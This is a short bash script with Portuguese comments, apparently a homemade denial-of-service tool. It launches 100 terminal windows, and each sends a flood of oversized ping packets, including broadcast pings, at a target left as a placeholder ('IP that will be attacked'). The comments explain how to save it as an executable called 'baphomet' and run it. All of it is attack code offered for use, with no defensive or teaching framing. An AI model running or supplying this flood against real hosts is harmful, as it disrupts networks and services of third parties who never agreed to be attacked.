#!/bin/bash
num=100
comando="ping ip que sera atacado -s 65500 -c 10000000 -b"
for((i=1;i<=num;i++))
do
    gnome-terminal -- bash -c "$comando"
done

#esse é no linux 
#coloque no terminal (bash -c'echo "#bin/bash" > baphomet && cat baphomet.sh >> baphomet && chmod +x baphomet')
# ./baphomet